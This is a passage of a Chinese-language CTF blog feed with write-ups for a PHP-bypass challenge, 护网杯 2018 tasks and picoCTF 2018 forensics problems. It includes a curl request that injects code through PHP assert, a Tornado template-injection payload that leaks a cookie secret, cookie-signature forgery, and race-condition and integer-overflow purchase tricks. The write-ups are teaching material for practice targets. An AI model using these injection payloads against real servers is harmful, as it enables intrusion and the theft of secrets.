class="keyword">die</span>(<span class="string">"lel no\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// plz die now</span></span><br><span class="line">assert_options(ASSERT_BAIL, <span class="number">1</span>);</span><br><span class="line">assert(<span class="string">"$bb == $cc"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Good Job ;)"</span>;</span><br><span class="line"><span class="comment">// TODO</span></span><br><span class="line"><span class="comment">// echo $flag;</span></span><br></pre></td></tr></table></figure><p>用 <code>php -S 127.0.0.1:8080</code> 起一个本地服务用于调试。</p><p>13~15行可通过PHP wrapper 绕过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"https://arcade.fluxfingers.net:1819?msg=php://input"</span> -d <span class="string">"Hello Challenge!"</span></span><br><span class="line">or</span><br><span class="line">curl <span class="string">"https://arcade.fluxfingers.net:1819?msg=data://text/plain,Hello%20Challenge!"</span></span><br></pre></td></tr></table></figure><p>24~26行传入key1=1337即可，$k1类型为string。</p><p>29行的美元符是个宽字节字符，并不是ASCII为36的字符。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">encodeURI</span>(<span class="string">"＄"</span>)</span><br><span class="line">&lt;<span class="string">"%EF%BC%84"</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $e=str_repeat(<span class="string">"0"</span>,<span class="number">42</span><span class="number">-3</span><span class="number">-4</span>).<span class="string">"1337 "</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> strlen($e);</span><br><span class="line"><span class="number">42</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> $e;</span><br><span class="line"><span class="number">000000000000000000000000000000000001337</span>＄</span><br></pre></td></tr></table></figure><p>38行可以通过传入数组绕过。39行有变量覆盖。</p><p>44行是个障眼法，在第一个美元符后有个Unicode 字符(<code>U+202e</code>)，用以左右反转，详见 <a href="https://rawsec.ml/en/2-less-known-tricks-spoofing-extensions/#rtlo-trick" target="_blank" rel="noopener">rtlo-trick</a>。十六进制看起来实际上是这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">000002f0: 24e2 80ae 6220 3d20 2232 223b 2461 3d22  $...b = <span class="string">"2"</span>;<span class="variable">$a</span>=<span class="string">"</span></span><br><span class="line"><span class="string">00000300: e280 ae62 223b 2f2f 3b31 3d62 0d0a 0d0a  ...b"</span>;//;1=b....</span><br></pre></td></tr></table></figure><p>就是说，第44行是 <code>$\u{202E}b = &quot;2&quot;;$a=&quot;\u{202E}b&quot;;//;1=b</code> ，但经过Unicode字符作用后显示出来的是<code>$b=1;//;&quot;b&quot;=a$;&quot;2&quot; = b</code> 。推荐一个辅助工具：<a href="https://r12a.github.io/app-conversion/" target="_blank" rel="noopener">https://r12a.github.io/app-conversion/</a> 。</p><p>则$$a的值为2，传入k1=2即可。</p><p>51行设置在断言失败时中止执行。</p><p>52行可以执行PHP代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ  curl -sg <span class="string">"https://arcade.fluxfingers.net:1819/?msg=data://text/plain,Hello%20Challenge!&amp;key1=1337&amp;key2=000000000000000000000000000000000001337%EF%BC%84&amp;cc[]=&amp;k1=2&amp;bb=highlight_file(%22flag.php%22);//"</span> | grep -o <span class="string">'flag&#123;.*&#125;'</span></span><br><span class="line">flag&#123;7c217708c5293a3264bb136ef1fadd6e&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>护网杯解题记录</title>
      <link href="/181013-huwangbei-writeup/"/>
      <url>/181013-huwangbei-writeup/</url>
      
        <content type="html"><![CDATA[<p><img src="1539436751699.png" alt="1539436751699"></p><h1 id="FEZ"><a href="#FEZ" class="headerlink" title="FEZ"></a>FEZ</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,k)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> xor(xor(x,k),<span class="number">7</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">(M,K)</span>:</span></span><br><span class="line">    L=M[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">    R=M[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">    new_l=R</span><br><span class="line">    new_r=xor(xor(R,L),K)</span><br><span class="line">    <span class="keyword">return</span> new_l+new_r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fez</span><span class="params">(m,K)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">        m=round(m,i)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">K=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    K.append(os.urandom(<span class="number">27</span>))</span><br><span class="line">m=open(<span class="string">"flag"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"><span class="keyword">assert</span> len(m)&lt;<span class="number">54</span></span><br><span class="line">m+=os.urandom(<span class="number">54</span>-len(m))</span><br><span class="line"></span><br><span class="line">test=os.urandom(<span class="number">54</span>)</span><br><span class="line"><span class="keyword">print</span> test.encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> fez(test,K).encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> fez(m,K).encode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure><p>假设最后一轮结束后高低字节分别为l,r，可逐轮逆推出上一轮的值，从而得到明文和密文的关系。由已知的一组test明文密文对，可得到flag的明文。</p><table><thead><tr><th>round</th><th>left</th><th>right</th></tr></thead><tbody><tr><td>0</td><td>l^r^k[0]^k[1]^k[3]^k[4]^k[6]</td><td>l^k[1]^k[2]^k[4]^k[5]</td></tr><tr><td>1</td><td>l^k[1]^k[2]^k[4]^k[5]</td><td>r^k[2]^k[3]^k[5]^k[6]</td></tr><tr><td>2</td><td>r^k[2]^k[3]^k[5]^k[6]</td><td>l^r*k[3]^k[4]^k[6]</td></tr><tr><td>3</td><td>l^r*k[3]^k[4]^k[6]</td><td>l^k[4]^k[5]</td></tr><tr><td>4</td><td>l^k[4]^k[5]</td><td>r^k[5]^k[6]</td></tr><tr><td>5</td><td>r^k[5]^k[6]</td><td>r^l^k[6]</td></tr><tr><td>6</td><td>r^l^k[6]</td><td>l</td></tr><tr><td>7</td><td>l</td><td>r</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = findneo</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">all_xor = <span class="keyword">lambda</span> x:reduce(xor,x)</span><br><span class="line">test_plain=<span class="string">"c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd5"</span></span><br><span class="line">test_cipher=<span class="string">"5c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81"</span></span><br><span class="line">flag_cipher=<span class="string">"519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76"</span></span><br><span class="line"></span><br><span class="line">p=test_plain.decode(<span class="string">"hex"</span>)</span><br><span class="line">c=test_cipher.decode(<span class="string">"hex"</span>)</span><br><span class="line">f=flag_cipher.decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">l,r=c[<span class="number">0</span>:<span class="number">27</span>],c[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">pl,pr=p[<span class="number">0</span>:<span class="number">27</span>],p[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">fl,fr=f[<span class="number">0</span>:<span class="number">27</span>],f[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">fcl=all_xor([l,r,pl,fl,fr])</span><br><span class="line">fcr=all_xor([l,pr,fl])</span><br><span class="line">flag=fcl+fcr</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="comment">#flag&#123;festel_weak_666_plo88112tty&#125;</span></span><br></pre></td></tr></table></figure><h1 id="LTSHOP"><a href="#LTSHOP" class="headerlink" title="LTSHOP"></a>LTSHOP</h1><p>使用burp的intruder竞争买大辣条，得到超过五个大辣条。</p><p><img src="1539428933786.png" alt="1539428933786"></p><p>然后买 <code>2**64/5+1</code> 个辣条王，使得需要付的大辣条多到uint装不下，向上溢出为负数，我们就买得起很多的辣条王了，实现一夜暴富。</p><p><img src="1539429086591.png" alt="1539429086591"></p><p>然后flag就随便买了。</p><p><img src="1539429113491.png" alt="1539429113491"></p><p><img src="1539437436657.png" alt="1539437436657"></p><h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>有三个提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.78.9:31465/file?filename=flag.txt&amp;signature=95660d430a8ad05fc7337d12e6a08b1a</span><br><span class="line">render()</span><br><span class="line">md5(cookie_secret + md5(filename))</span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure><p>报错页面存在SSTI。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问 `http://49.4.78.9:31465/error?msg=&#123;&#123;handler.settings&#125;&#125;`得到配置信息。</span><br><span class="line">Whoops, looks like somethings went wrong . </span><br><span class="line">&#123;'login_url': '/login', 'template_path': 'templates', 'xsrf_cookies': True, 'cookie_secret': 'pGD*~9Y]N?&gt;5zBvS_3768U+O&#125;<span class="tag">&lt;<span class="name">#^k@oM$grqZQ4!yK1ucVnijmRJlFwI%hP(0exE',</span> '<span class="attr">debug</span>'<span class="attr">:</span> <span class="attr">False</span>, '<span class="attr">file_path</span>'<span class="attr">:</span> '/<span class="attr">www</span>/<span class="attr">static</span>/<span class="attr">files</span>', '<span class="attr">static_path</span>'<span class="attr">:</span> '<span class="attr">static</span>'&#125;</span></span><br></pre></td></tr></table></figure><p>得到cookie_secret，即可构造签名读取flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc@xyz:~$ curl <span class="string">"http://49.4.78.9:31465/file?filename=/fllllllllllag&amp;signature=8f270fa794962fa2ec4e63e6b03a830b"</span> -s | grep flag</span><br><span class="line">flag&#123;59a95928373bfa789e06635d2d5e9459&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a> </p><h1 id="更多题解"><a href="#更多题解" class="headerlink" title="更多题解"></a>更多题解</h1><ul><li><a href="https://xz.aliyun.com/t/2893" target="_blank" rel="noopener">护网杯2018线上赛 Writeup by Whitzard</a> </li><li><a href="https://xz.aliyun.com/t/2897" target="_blank" rel="noopener">2018护网杯线上赛 Writeup by 天枢</a> </li><li><a href="https://xz.aliyun.com/t/2892" target="_blank" rel="noopener">2018护网杯线上赛题解by Lilac</a> </li><li><a href="http://www.venenof.com/index.php/archives/565/" target="_blank" rel="noopener">护网杯-easy laravel-Writeup</a> </li><li><a href="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/" target="_blank" rel="noopener">2018护网杯-web-writeup</a> </li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>picoCTF-2018 解题报告</title>
      <link href="/180929-picoctf/"/>
      <url>/180929-picoctf/</url>
      
        <content type="html"><![CDATA[<p><img src="1539266772853.png" alt="1539266772853"></p><p>题目：</p><ul><li><a href="https://2018game.picoctf.com/problems" target="_blank" rel="noopener">https://2018game.picoctf.com/problems</a></li><li>备用：<a href="https://findneo.github.io/p/picoCTF-2018-Problems.html">https://findneo.github.io/p/picoCTF-2018-Problems.html</a> </li><li>附件：<a href="https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf" target="_blank" rel="noopener">https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf</a> </li></ul><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Forensics-Warmup-1"><a href="#Forensics-Warmup-1" class="headerlink" title="Forensics Warmup 1"></a>Forensics Warmup 1</h2><p><code>picoCTF{welcome_to_forensics}</code> </p><h2 id="Forensics-Warmup-2"><a href="#Forensics-Warmup-2" class="headerlink" title="Forensics Warmup 2"></a>Forensics Warmup 2</h2><p><code>picoCTF{extensions_are_a_lie}</code> </p><h2 id="Desrouleaux"><a href="#Desrouleaux" class="headerlink" title="Desrouleaux"></a>Desrouleaux</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">nc 2018shell2.picoctf.com 63299</span><br><span class="line">You<span class="string">'ll need to consult the file `incidents.json` to answer the following questions.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">What is the most common source IP address? If there is more than one IP address that is the most common, you may give any of the most common ones.</span></span><br><span class="line"><span class="string">250.226.237.236</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">How many unique destination IP addresses were targeted by the source IP address 193.1.59.100?</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">What is the average number of unique destination IP addresses that were sent a file with the same hash? Your answer needs to be correct to 2 decimal places.</span></span><br><span class="line"><span class="string">1.43</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Great job. You'</span>ve earned the flag: picoCTF&#123;J4y_s0n_d3rUUUULo_23fa6fa6&#125;</span><br><span class="line"></span><br><span class="line">/*精确到小数点后两位 (1+1+2+1+3+1+1)/7=1.43</span><br><span class="line"></span><br><span class="line">import json</span><br><span class="line">j=json.load(open(<span class="string">'incidents.json'</span>))</span><br><span class="line">tickets=j[<span class="string">'tickets'</span>]</span><br><span class="line">hashes=dict()</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tickets:</span><br><span class="line"><span class="keyword">if</span> t[<span class="string">'file_hash'</span>] not <span class="keyword">in</span> hashes.keys():</span><br><span class="line">hashes[t[<span class="string">'file_hash'</span>]]=[t[<span class="string">'dst_ip'</span>]]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">hashes[t[<span class="string">'file_hash'</span>]].append(t[<span class="string">'dst_ip'</span>])</span><br><span class="line"><span class="built_in">print</span> hashes</span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment"># u'78d8572c143fb161': [u'90.174.224.210'], </span></span><br><span class="line"><span class="comment"># u'a275ec611d018a67': [u'94.165.167.88'], </span></span><br><span class="line"><span class="comment"># u'308f80097c708e3d': [u'90.174.224.210', u'216.243.24.241'], </span></span><br><span class="line"><span class="comment"># u'27d9b03884d73aaa': [u'94.165.167.88'], </span></span><br><span class="line"><span class="comment"># u'23420f902d5382e1': [u'94.165.167.88', u'16.139.98.188', u'46.11.226.205'], </span></span><br><span class="line"><span class="comment"># u'ea45791ce3528103': [u'127.19.170.162'], </span></span><br><span class="line"><span class="comment"># u'729b56eab8ac3252': [u'94.165.167.88']&#125;</span></span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h2 id="Reading-Between-the-Eyes"><a href="#Reading-Between-the-Eyes" class="headerlink" title="Reading Between the Eyes"></a>Reading Between the Eyes</h2><p><img src="1538361495312.png" alt="1538361495312"></p><p><code>picoCTF{r34d1ng_b37w33n_7h3_by73s}</code> </p><h2 id="Recovering-From-the-Snap"><a href="#Recovering-From-the-Snap" class="headerlink" title="Recovering From the Snap"></a>Recovering From the Snap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/picoctf<span class="comment"># file animals.dd</span></span><br><span class="line">animals.dd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID <span class="string">"mkfs.fat"</span>, sectors/cluster 4, root entries 512, sectors 20480 (volumes &lt;=32 MB), Media descriptor 0xf8, sectors/FAT 20, sectors/track 32, heads 64, reserved 0x1, serial number 0x9b664dde, unlabeled, FAT (16 bit)</span><br><span class="line">root@kali:~/桌面/picoctf<span class="comment"># fdisk -lu animals.dd</span></span><br><span class="line">Disk animals.dd: 10 MiB, 10485760 bytes, 20480 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x00000000</span><br></pre></td></tr></table></figure><p>参考 <a href="https://www.bleepingcomputer.com/forums/t/522890/imagedd-file-of-a-corrupted-external-hd-looking-to-mountrecover/" target="_blank" rel="noopener">这里</a> ，使用<a href="https://www.osforensics.com/tools/mount-disk-images.html" target="_blank" rel="noopener">OSFMount</a> 挂载磁盘，使用 <a href="https://www.cgsecurity.org/wiki/TestDisk_Download" target="_blank" rel="noopener">TestDisk &amp; PhotoRec 7.1-WIP, Data Recovery</a> 恢复被删除的<code>theflag.jpg</code> 。</p><p><code>picoCTF{th3_5n4p_happ3n3d}</code> </p><p><img src="1538323453203.png" alt="1538323453203"></p><h2 id="admin-panel"><a href="#admin-panel" class="headerlink" title="admin panel"></a>admin panel</h2><p>用wireshark打开，导出HTTP对象，其中一个文件内容是<code>user=admin&amp;password=picoCTF{n0ts3cur3_df598569}</code> 。</p><h2 id="hex-editor"><a href="#hex-editor" class="headerlink" title="hex editor"></a>hex editor</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings hex_editor.jpg | grep pico</span><br><span class="line">Your flag is: <span class="string">"picoCTF&#123;and_thats_how_u_edit_hex_kittos_8BcA67a2&#125;"</span></span><br></pre></td></tr></table></figure><h2 id="Truly-an-Artist"><a href="#Truly-an-Artist" class="headerlink" title="Truly an Artist"></a>Truly an Artist</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings 2018.png | grep pico</span><br><span class="line">picoCTF&#123;look_in_image_9f5be995&#125;</span><br></pre></td></tr></table></figure><h2 id="now-you-don’t"><a href="#now-you-don’t" class="headerlink" title="now you don’t"></a>now you don’t</h2><p><img src="1538239287549.png" alt="1538239287549"></p><p><code>picoCTF{n0w_y0u_533_m3}</code></p><h2 id="Ext-Super-Magic"><a href="#Ext-Super-Magic" class="headerlink" title="Ext Super Magic"></a>Ext Super Magic</h2><p>根据提示使用debugfs查看img文件，发现幻数损坏。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># debugfs ext.img</span></span><br><span class="line">debugfs 1.44.4 (18-Aug-2018)</span><br><span class="line">debugfs: Bad magic number <span class="keyword">in</span> super-block <span class="keyword">while</span> trying to open ext.img</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>从文档（<a href="https://wiki.osdev.org/Ext2#Superblock" target="_blank" rel="noopener">https://wiki.osdev.org/Ext2#Superblock</a>）可以看到使用ext2文件系统的第一步是寻找、提取、解析superblock。superblock总是从卷的1024字节开始，长度为1024字节。也就是说，如果一个扇区是512字节，那么superblock位于第2、3扇区。而在superblock中，ext2文件的signature（0xef53）位于第56、57两个字节，所以我们要修正文件的magic number为正确的signature，也就是修改(1024+56,1024+57)bytes即(1080,1081)bytes即(0x438,0x439)bytes的值为<code>0xef53</code> 。需注意采用小端序，低字节在低地址。</p><p><img src="1541167493772.png" alt="1541167493772"></p><p>根据文档修改superblock，然后可以mount到系统，发现有个flag图片。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file fix.img</span></span><br><span class="line">fix.img: Linux rev 1.0 ext2 filesystem data, UUID=a3708ef2-5ec0-4463-9a03-599c890645cd (large files)</span><br><span class="line"><span class="comment"># xxd ext.img &gt; ext.hex</span></span><br><span class="line"><span class="comment"># xxd fix.img &gt; fix.hex</span></span><br><span class="line"><span class="comment"># diff *.hex</span></span><br><span class="line">68c68</span><br><span class="line">&lt; 00000430: 34dc ad5b 0100 ffff 0000 0100 0100 0000  4..[............</span><br><span class="line">---</span><br><span class="line">&gt; 00000430: 34dc ad5b 0100 ffff 53ef 0100 0100 0000  4..[....S.......</span><br><span class="line"><span class="comment"># mkdir tmpdir &amp;&amp; mount fix.img tmpdir &amp;&amp; ll tmpdir/ | grep flag</span></span><br></pre></td></tr></table></figure><p><img src="1541122722339.png" alt="1541122722339"></p><p><img src="1541122685539.png" alt="1541122685539"></p><p>尝试了多个命令行OCR工具，tesseract-ocr效果最好，但识别结果还需要修正。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$apt</span> install gocr</span><br><span class="line"><span class="variable">$apt</span> install cuneiform</span><br><span class="line"><span class="variable">$apt</span> install tesseract-ocr</span><br><span class="line"><span class="variable">$tesseract</span> cut_flag.jpg res &amp;&amp; cat res.txt</span><br><span class="line">Tesseract Open Source OCR Engine v4.0.0-rc4 with Leptonica</span><br><span class="line">Your flag is: <span class="string">"picoCTF &#123;FDBfbc6141e7F 4bscI90CIaE7SbI63aEf&#125; "</span></span><br></pre></td></tr></table></figure><p>最后结果：<code>picoCTF{FDBfbC6141e7F4b8c90C9aE78b963aEf}</code></p><h2 id="Lying-Out"><a href="#Lying-Out" class="headerlink" title="Lying Out"></a>Lying Out</h2><p>根据日常流量图判断流量可能异常的时间点。</p><p><img src="1538371756947.png" alt="1538371756947"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">log=[</span><br><span class="line">    <span class="number">10900</span>,<span class="number">10800</span>,<span class="number">10850</span>,<span class="number">11000</span>,<span class="number">10800</span>,<span class="number">10750</span>,<span class="number">10800</span>,<span class="number">10850</span>,</span><br><span class="line">    <span class="number">10900</span>,<span class="number">11000</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">11000</span>,<span class="number">10900</span>,<span class="number">10700</span>,<span class="number">10850</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">10850</span>,<span class="number">11000</span>,<span class="number">11050</span>,<span class="number">10650</span>,<span class="number">10800</span>,<span class="number">10700</span>,<span class="number">11000</span>,</span><br><span class="line">    <span class="number">10900</span>,<span class="number">10950</span>,<span class="number">10950</span>,<span class="number">10800</span>,<span class="number">11000</span>,<span class="number">11100</span>,<span class="number">11900</span>,<span class="number">13400</span>,</span><br><span class="line">    <span class="number">13800</span>,<span class="number">13400</span>,<span class="number">12000</span>,<span class="number">11000</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10700</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">11000</span>,<span class="number">10900</span>,<span class="number">11050</span>,<span class="number">11800</span>,<span class="number">13100</span>,<span class="number">14600</span>,<span class="number">16100</span>,</span><br><span class="line">    <span class="number">16600</span>,<span class="number">16400</span>,<span class="number">14400</span>,<span class="number">12800</span>,<span class="number">11800</span>,<span class="number">11000</span>,<span class="number">10950</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10900</span>,<span class="number">10850</span>,<span class="number">10850</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">11000</span>,<span class="number">11000</span>,<span class="number">11000</span>,<span class="number">11400</span>,<span class="number">11900</span>,<span class="number">13000</span>,<span class="number">14000</span>,</span><br><span class="line">    <span class="number">14800</span>,<span class="number">15800</span>,<span class="number">16200</span>,<span class="number">15800</span>,<span class="number">14700</span>,<span class="number">13700</span>,<span class="number">12200</span>,<span class="number">12100</span>,</span><br><span class="line">    <span 